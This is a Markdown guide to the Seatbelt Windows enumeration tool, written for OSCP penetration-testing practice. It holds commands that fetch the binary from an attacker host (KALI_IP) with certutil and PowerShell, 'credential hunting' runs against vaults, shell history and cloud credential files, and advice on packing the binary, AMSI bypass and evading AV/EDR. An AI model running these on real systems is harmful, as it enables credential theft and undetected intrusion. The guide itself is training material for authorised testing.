# Seatbelt - Windows Enumeration Tool Guide

## Table of Contents
1. [Installation & Setup](#1-installation--setup)
2. [Basic Concepts](#2-basic-concepts)
3. [Command Groups](#3-command-groups)
4. [System Enumeration](#4-system-enumeration)
5. [User & Credential Enumeration](#5-user--credential-enumeration)
6. [Process & Service Enumeration](#6-process--service-enumeration)
7. [Network Enumeration](#7-network-enumeration)
8. [File & Registry Enumeration](#8-file--registry-enumeration)
9. [Security Settings](#9-security-settings)
10. [Remote Execution](#10-remote-execution)
11. [Output Formats](#11-output-formats)
12. [Common OSCP Patterns](#12-common-oscp-patterns)
13. [Troubleshooting](#13-troubleshooting)
14. [Quick Reference](#14-quick-reference)

---

## 1. Installation & Setup

### 1.1 Download

```powershell
# Download from GitHub
# https://github.com/GhostPack/Seatbelt

# Pre-compiled binary locations (typically)
# - Kali: /usr/share/windows-resources/seatbelt/
# - Local: Download latest release from GitHub
```

### 1.2 Transfer to Target

```bash
# Kali: Start HTTP server
python3 -m http.server 80

# Target (PowerShell):
Invoke-WebRequest -Uri http://KALI_IP/Seatbelt.exe -OutFile C:\temp\Seatbelt.exe

# Target (certutil):
certutil -urlcache -f http://KALI_IP/Seatbelt.exe C:\temp\Seatbelt.exe

# Target (curl - if available):
curl http://KALI_IP/Seatbelt.exe -o C:\temp\Seatbelt.exe
```

### 1.3 Verify

```powershell
# Check if it runs
.\Seatbelt.exe -h
```

---

## 2. Basic Concepts

### 2.1 What is Seatbelt?

Seatbelt is a C# project that performs a number of security-oriented host-survey "safety checks" relevant from both offensive and defensive perspectives.

**Key Features:**
- **No admin required**: Most checks work without elevated privileges
- **Fast enumeration**: Runs quickly for situational awareness
- **Modular checks**: Run specific checks or command groups
- **Multiple output formats**: Console, JSON, file output

### 2.2 Basic Syntax

```powershell
# Basic syntax
.\Seatbelt.exe [CommandGroup] [Options]

# Single command
.\Seatbelt.exe <command>

# Multiple commands
.\Seatbelt.exe <command1> <command2> <command3>

# Command group
.\Seatbelt.exe -group=<groupname>
```

### 2.3 Command Groups

```powershell
# All checks (use with caution - very verbose!)
.\Seatbelt.exe -group=all

# System-related checks
.\Seatbelt.exe -group=system

# User-related checks
.\Seatbelt.exe -group=user

# Chromium-based browser enumeration
.\Seatbelt.exe -group=chromium

# Remote system enumeration
.\Seatbelt.exe -group=remote -computername=TARGET -username=DOMAIN\user -password=pass

# Slack workspace enumeration
.\Seatbelt.exe -group=slack

# Miscellaneous checks
.\Seatbelt.exe -group=misc
```

---

## 3. Command Groups

### 3.1 Available Groups

| Group | Description |
|-------|-------------|
| **all** | Run all checks (very verbose!) |
| **system** | System-level checks (OS info, patches, services, etc.) |
| **user** | User-level checks (current user context) |
| **chromium** | Chromium browser enumeration (Chrome, Edge, Brave) |
| **remote** | Remote system enumeration |
| **slack** | Slack workspace enumeration |
| **misc** | Miscellaneous checks |

### 3.2 System Group

```powershell
# Run all system checks
.\Seatbelt.exe -group=system

# Includes:
# - AMSIProviders, AntiVirus, AppLocker
# - ARPTable, AuditSettings, AutoRuns
# - Certificates, CredGuard, DNSCache
# - DotNet, EnvironmentPath, EnvironmentVariables
# - Hotfixes, InterestingProcesses, InternetSettings
# - LAPS, LocalGPOs, LocalGroups, LocalUsers
# - LogonSessions, LSASettings, McAfeeConfigs
# - NamedPipes, NetworkProfiles, NetworkShares
# - NTLMSettings, OSInfo, PowerShell
# - Processes, PSSessionSettings, RDPSessions
# - RDPSettings, SCCM, Services, Sysmon
# - TcpConnections, TokenGroups, UAC
# - UdpConnections, WindowsDefender, WindowsEventForwarding
# - WindowsFirewall, WMI, WSUS
```

### 3.3 User Group

```powershell
# Run all user checks
.\Seatbelt.exe -group=user

# Includes:
# - ChromiumBookmarks, ChromiumHistory, ChromiumPresence
# - CloudCredentials, CredEnum, Dir
# - DpapiMasterKeys, Dsregcmd, ExplorerMRUs
# - ExplorerRunCommands, FileZilla, FirefoxHistory
# - IdleTime, IEFavorites, IETabs, IEUrls
# - KeePass, MappedDrives, OfficeMRUs
# - OracleSQLDeveloper, OSInfo, OutlookDownloads
# - PowerShellHistory, PuttyHostKeys, PuttySessions
# - RDCManFiles, RDPSavedConnections, SecPackageCreds
# - SlackDownloads, SlackPresence, SlackWorkspaces
# - SuperPutty, TokenGroups, WindowsCredentialFiles
# - WindowsVault
```

---

## 4. System Enumeration

### 4.1 OS Information

```powershell
# OS information
.\Seatbelt.exe OSInfo

# Example output:
# - OS Version (Windows 10, Server 2019, etc.)
# - Build Number
# - Architecture (x64, x86)
# - Registered Owner
# - System Directory
# - Boot Time
# - Locale
```

### 4.2 Installed Hotfixes

```powershell
# List installed hotfixes/patches
.\Seatbelt.exe Hotfixes

# Useful to identify missing patches
# Cross-reference with known exploits (e.g., MS17-010, PrintNightmare)
```

### 4.3 Services

```powershell
# Enumerate services
.\Seatbelt.exe Services

# Look for:
# - Unquoted service paths
# - Services running as SYSTEM
# - Weak permissions on service binaries
```

### 4.4 Processes

```powershell
# Enumerate running processes
.\Seatbelt.exe Processes

# Look for:
# - Processes running as SYSTEM/Admin
# - Interesting processes (SQL, web servers, AV)
```

### 4.5 AppLocker

```powershell
# Check AppLocker policies
.\Seatbelt.exe AppLocker

# Identifies application whitelisting restrictions
```

### 4.6 PowerShell

```powershell
# PowerShell settings
.\Seatbelt.exe PowerShell

# Checks:
# - PowerShell version
# - Logging settings
# - Transcript settings
# - ScriptBlock logging
# - Module logging
```

---

## 5. User & Credential Enumeration

### 5.1 Current User Context

```powershell
# Token groups (current user's group memberships)
.\Seatbelt.exe TokenGroups

# Shows SIDs and privileges
```

### 5.2 Local Users & Groups

```powershell
# Local users
.\Seatbelt.exe LocalUsers

# Local groups
.\Seatbelt.exe LocalGroups

# Useful to identify admin users
```

### 5.3 Logon Sessions

```powershell
# Active logon sessions
.\Seatbelt.exe LogonSessions

# Shows:
# - Username
# - Domain
# - Logon ID
# - Logon Type
# - Authentication Package
# - Logon Time
```

### 5.4 Credential Files

```powershell
# Windows Credential Files
.\Seatbelt.exe WindowsCredentialFiles

# Searches for:
# - Credential Manager files
# - RDP credential files
```

### 5.5 Windows Vault

```powershell
# Windows Vault credentials
.\Seatbelt.exe WindowsVault

# Enumerates stored credentials in Windows Vault
```

### 5.6 DPAPI Master Keys

```powershell
# DPAPI Master Keys
.\Seatbelt.exe DpapiMasterKeys

# Lists DPAPI master key locations
# Useful for credential decryption
```

### 5.7 Cloud Credentials

```powershell
# Cloud credential files (AWS, Azure, etc.)
.\Seatbelt.exe CloudCredentials

# Searches for:
# - AWS credentials (~/.aws/credentials)
# - Azure credentials
# - GCP credentials
```

---

## 6. Process & Service Enumeration

### 6.1 Interesting Processes

```powershell
# Interesting processes
.\Seatbelt.exe InterestingProcesses

# Looks for:
# - Database processes (SQL, MySQL)
# - Web servers (IIS, Apache)
# - Security products
# - Development tools
```

### 6.2 Services

```powershell
# All services
.\Seatbelt.exe Services

# Filter for specific service
.\Seatbelt.exe Services | Select-String -Pattern "service_name"
```

### 6.3 AutoRuns

```powershell
# AutoRun entries
.\Seatbelt.exe AutoRuns

# Checks:
# - HKLM Run keys
# - HKCU Run keys
# - Startup folder
# - Scheduled tasks (basic)
```

---

## 7. Network Enumeration

### 7.1 Network Interfaces

```powershell
# Network adapter information
.\Seatbelt.exe NetworkProfiles

# Shows network profile information
```

### 7.2 ARP Table

```powershell
# ARP table
.\Seatbelt.exe ARPTable

# Shows cached ARP entries (other hosts on network)
```

### 7.3 Active Connections

```powershell
# TCP connections
.\Seatbelt.exe TcpConnections

# UDP connections
.\Seatbelt.exe UdpConnections

# Look for:
# - Listening ports
# - Established connections
# - Potential pivot targets
```

### 7.4 DNS Cache

```powershell
# DNS cache entries
.\Seatbelt.exe DNSCache

# Shows recently resolved hostnames
# Useful to identify internal infrastructure
```

### 7.5 Network Shares

```powershell
# Network shares
.\Seatbelt.exe NetworkShares

# Lists:
# - Share name
# - Share path
# - Description
```

### 7.6 RDP Sessions

```powershell
# RDP sessions
.\Seatbelt.exe RDPSessions

# Shows active/disconnected RDP sessions
```

### 7.7 RDP Settings

```powershell
# RDP configuration
.\Seatbelt.exe RDPSettings

# Checks:
# - RDP enabled/disabled
# - NLA requirement
# - Port (default 3389)
```

---

## 8. File & Registry Enumeration

### 8.1 Interesting Files

```powershell
# Search for interesting files (limited)
.\Seatbelt.exe Dir

# Requires additional parameters:
# -path=C:\Users\
# -regex=<pattern>
```

### 8.2 Recent Files (MRU)

```powershell
# Explorer MRUs (Most Recently Used)
.\Seatbelt.exe ExplorerMRUs

# Shows recently accessed files/folders
```

### 8.3 Office MRUs

```powershell
# Office MRUs
.\Seatbelt.exe OfficeMRUs

# Recently opened Office documents
```

### 8.4 PowerShell History

```powershell
# PowerShell command history
.\Seatbelt.exe PowerShellHistory

# Reads ConsoleHost_history.txt
# May contain passwords/sensitive commands
```

### 8.5 Browser History

```powershell
# Chromium-based browsers (Chrome, Edge, Brave)
.\Seatbelt.exe ChromiumHistory
.\Seatbelt.exe ChromiumBookmarks

# Firefox
.\Seatbelt.exe FirefoxHistory
```

### 8.6 Saved Browser Credentials

```powershell
# Chromium presence check
.\Seatbelt.exe ChromiumPresence

# Identifies Chromium-based browser installations
```

### 8.7 Application Configs

```powershell
# FileZilla
.\Seatbelt.exe FileZilla

# PuTTY
.\Seatbelt.exe PuttyHostKeys
.\Seatbelt.exe PuttySessions

# SuperPutty
.\Seatbelt.exe SuperPutty

# KeePass
.\Seatbelt.exe KeePass

# Oracle SQL Developer
.\Seatbelt.exe OracleSQLDeveloper

# RDCMan (Remote Desktop Connection Manager)
.\Seatbelt.exe RDCManFiles
```

---

## 9. Security Settings

### 9.1 AntiVirus

```powershell
# AV products
.\Seatbelt.exe AntiVirus

# Detects installed AV software
```

### 9.2 Windows Defender

```powershell
# Windows Defender settings
.\Seatbelt.exe WindowsDefender

# Shows:
# - Real-time protection status
# - Exclusion paths
# - Threat detections
```

### 9.3 AMSI

```powershell
# AMSI providers
.\Seatbelt.exe AMSIProviders

# Lists registered AMSI providers
```

### 9.4 UAC Settings

```powershell
# UAC configuration
.\Seatbelt.exe UAC

# Shows User Account Control settings
```

### 9.5 LAPS

```powershell
# LAPS (Local Administrator Password Solution)
.\Seatbelt.exe LAPS

# Checks if LAPS is deployed
```

### 9.6 Credential Guard

```powershell
# Credential Guard status
.\Seatbelt.exe CredGuard

# Shows if Credential Guard is enabled
```

### 9.7 LSA Settings

```powershell
# LSA protection settings
.\Seatbelt.exe LSASettings

# Checks:
# - RunAsPPL (LSA Protection)
# - Credential Guard
```

### 9.8 Audit Settings

```powershell
# Audit policies
.\Seatbelt.exe AuditSettings

# Shows audit policy configuration
```

### 9.9 Sysmon

```powershell
# Sysmon detection
.\Seatbelt.exe Sysmon

# Checks if Sysmon is installed
```

### 9.10 Windows Firewall

```powershell
# Firewall settings
.\Seatbelt.exe WindowsFirewall

# Shows firewall profile status
```

---

## 10. Remote Execution

### 10.1 Remote System Enumeration

```powershell
# Enumerate remote system
.\Seatbelt.exe -group=system -computername=TARGET -username=DOMAIN\user -password=pass

# Specific command on remote system
.\Seatbelt.exe OSInfo -computername=192.168.1.10 -username=CORP\admin -password=P@ssw0rd

# Using current credentials
.\Seatbelt.exe OSInfo -computername=TARGET
```

### 10.2 Requirements

- Admin access to target (usually)
- RPC/WMI access (port 135, 445)
- Proper authentication

---

## 11. Output Formats

### 11.1 Console Output

```powershell
# Default: Console output
.\Seatbelt.exe OSInfo
```

### 11.2 File Output

```powershell
# Save to file
.\Seatbelt.exe -group=all -outputfile=C:\temp\seatbelt_output.txt

# JSON output
.\Seatbelt.exe -group=all -outputfile=C:\temp\output.json
```

### 11.3 Filtering Output

```powershell
# PowerShell filtering
.\Seatbelt.exe Services | Select-String -Pattern "Unquoted"
.\Seatbelt.exe Processes | Select-String -Pattern "sql"

# Save filtered output
.\Seatbelt.exe -group=system | Out-File C:\temp\system_enum.txt
```

---

## 12. Common OSCP Patterns

### 12.1 Pattern 1: Initial Enumeration

```powershell
# Quick situational awareness
.\Seatbelt.exe OSInfo TokenGroups LocalUsers LocalGroups

# Output:
# - OS version (check for known vulnerabilities)
# - Current user privileges
# - Other local users (potential targets)
# - Group memberships
```

### 12.2 Pattern 2: Privilege Escalation Research

```powershell
# Check for privilege escalation vectors
.\Seatbelt.exe Services AutoRuns Processes

# Look for:
# - Unquoted service paths
# - Services with weak permissions
# - Processes running as SYSTEM
# - AutoRun entries you can modify
```

### 12.3 Pattern 3: Credential Hunting

```powershell
# Search for credentials
.\Seatbelt.exe PowerShellHistory WindowsCredentialFiles WindowsVault CloudCredentials FileZilla PuttySessions

# Check:
# - PowerShell history (might contain passwords)
# - Saved credentials
# - Application configs (FTP, SSH)
```

### 12.4 Pattern 4: Network Reconnaissance

```powershell
# Network information
.\Seatbelt.exe ARPTable DNSCache TcpConnections NetworkShares

# Identify:
# - Other hosts on network
# - Internal hostnames
# - Active connections (potential pivot targets)
# - Accessible shares
```

### 12.5 Pattern 5: Security Bypass Research

```powershell
# Check security controls
.\Seatbelt.exe AntiVirus WindowsDefender AppLocker UAC AMSI Sysmon

# Determine:
# - AV/EDR products
# - Application whitelisting
# - Logging/monitoring
# - Defensive controls to bypass
```

### 12.6 Pattern 6: Full System Audit

```powershell
# Comprehensive enumeration (save to file)
.\Seatbelt.exe -group=all -outputfile=C:\temp\full_enum.txt

# WARNING: This is VERY verbose and takes time
# Better for offline analysis
```

### 12.7 Pattern 7: Targeted Checks (OSCP Safe)

```powershell
# Fast, targeted enumeration for OSCP
.\Seatbelt.exe OSInfo Hotfixes TokenGroups LocalUsers LocalGroups Services Processes PowerShellHistory WindowsCredentialFiles

# This combination:
# - Runs quickly (< 1 minute)
# - Focuses on high-value checks
# - Minimal noise/detection risk
```

---

## 13. Troubleshooting

### 13.1 Access Denied Errors

```powershell
# Problem: "Access Denied" on certain checks
# Some checks require admin privileges

# Solution 1: Check your current privileges
whoami /priv
whoami /groups

# Solution 2: Try to elevate (if possible)
# Use UAC bypass or exploit

# Solution 3: Focus on non-admin checks
# Many checks work without admin
```

### 13.2 AMSI Detection

```powershell
# Problem: Seatbelt blocked by AMSI/AV

# Solution 1: Obfuscate binary
# Recompile with modified strings
# Use packer/crypter

# Solution 2: Disable AMSI (if possible)
# See AMSI bypass techniques

# Solution 3: Run specific checks only
# Avoid running full "-group=all"
```

### 13.3 Missing Output

```powershell
# Problem: Command runs but no output

# Check if command name is correct
.\Seatbelt.exe -h

# Some commands require additional parameters
.\Seatbelt.exe Dir -path=C:\Users\ -regex=".*"
```

### 13.4 Remote Execution Fails

```powershell
# Problem: Remote execution fails

# Check 1: Network connectivity
Test-NetConnection -ComputerName TARGET -Port 445

# Check 2: Credentials
# Ensure domain\user format or user@domain

# Check 3: Firewall/RPC
# Ensure ports 135, 445 are accessible
```

---

## 14. Quick Reference

### 14.1 Essential Commands

```powershell
# BASIC USAGE
.\Seatbelt.exe <command>                # Single command
.\Seatbelt.exe -group=<name>            # Command group
.\Seatbelt.exe -group=all               # All checks (verbose!)

# COMMON CHECKS
.\Seatbelt.exe OSInfo                   # OS information
.\Seatbelt.exe TokenGroups              # Current user groups/privileges
.\Seatbelt.exe LocalUsers               # Local users
.\Seatbelt.exe LocalGroups              # Local groups
.\Seatbelt.exe Services                 # Services
.\Seatbelt.exe Processes                # Processes
.\Seatbelt.exe Hotfixes                 # Installed patches
.\Seatbelt.exe AntiVirus                # AV products
.\Seatbelt.exe WindowsDefender          # Defender status
.\Seatbelt.exe PowerShellHistory        # PS history
.\Seatbelt.exe WindowsCredentialFiles   # Credential files
.\Seatbelt.exe TcpConnections           # Active connections
.\Seatbelt.exe ARPTable                 # ARP cache

# COMMAND GROUPS
.\Seatbelt.exe -group=system            # System checks
.\Seatbelt.exe -group=user              # User checks
.\Seatbelt.exe -group=chromium          # Browser checks
.\Seatbelt.exe -group=remote -computername=TARGET -username=USER -password=PASS

# OUTPUT
.\Seatbelt.exe -group=all -outputfile=C:\temp\output.txt
.\Seatbelt.exe OSInfo | Out-File output.txt
```

### 14.2 OSCP Quick Enum

```powershell
# Fast enumeration for OSCP
.\Seatbelt.exe OSInfo TokenGroups LocalUsers LocalGroups Services Processes Hotfixes PowerShellHistory WindowsCredentialFiles TcpConnections

# Credential hunting
.\Seatbelt.exe PowerShellHistory WindowsCredentialFiles WindowsVault FileZilla PuttySessions

# Privilege escalation research
.\Seatbelt.exe Services AutoRuns Processes TokenGroups

# Security controls
.\Seatbelt.exe AntiVirus WindowsDefender AppLocker UAC
```

### 14.3 Key Commands by Category

**System:**
- OSInfo, Hotfixes, Services, Processes, AutoRuns
- AppLocker, UAC, PowerShell, EnvironmentVariables

**Credentials:**
- PowerShellHistory, WindowsCredentialFiles, WindowsVault
- DpapiMasterKeys, CloudCredentials, CredEnum

**Network:**
- ARPTable, DNSCache, TcpConnections, UdpConnections
- NetworkShares, RDPSessions, RDPSettings

**Applications:**
- FileZilla, PuttyHostKeys, PuttySessions, ChromiumHistory
- FirefoxHistory, OfficeMRUs, ExplorerMRUs

**Security:**
- AntiVirus, WindowsDefender, AMSIProviders, Sysmon
- CredGuard, LSASettings, LAPS, AuditSettings

---

## 15. Resources

- **GitHub Repository**: https://github.com/GhostPack/Seatbelt
- **GhostPack Tools**: https://github.com/GhostPack
- **SpecterOps Blog**: https://posts.specterops.io/

---

## 16. Final Notes

**Für OSCP:**
- **No admin required**: Most checks work without elevated privileges
- **Fast enumeration**: Quick situational awareness tool
- **Modular**: Run only the checks you need
- **Credential hunting**: PowerShellHistory, WindowsCredentialFiles, application configs
- **Privesc research**: Services, AutoRuns, Processes

**Best Practices:**
1. Start with targeted checks (avoid `-group=all` initially)
2. Save output to file for offline analysis
3. Focus on high-value checks: OSInfo, Services, PowerShellHistory, Credentials
4. Cross-reference Hotfixes with known exploits
5. Look for unquoted service paths and weak permissions
6. Check PowerShell history for credentials
7. Use `-group=user` for non-admin enumeration

**OPSEC Considerations:**
- Seatbelt may trigger AV/EDR alerts
- `-group=all` is very verbose and easily detected
- Consider obfuscating the binary
- Run specific checks instead of full scan
- Be mindful of log generation

**Common Workflow:**
1. Transfer Seatbelt to target
2. Run quick enum: `OSInfo TokenGroups LocalUsers Services`
3. Credential hunting: `PowerShellHistory WindowsCredentialFiles`
4. Privilege escalation research: `Services Processes AutoRuns`
5. Save comprehensive output: `-group=all -outputfile=output.txt`
6. Analyze offline

**Remember:** Seatbelt is for situational awareness and enumeration. It doesn't exploit vulnerabilities - it identifies potential attack vectors for further investigation.
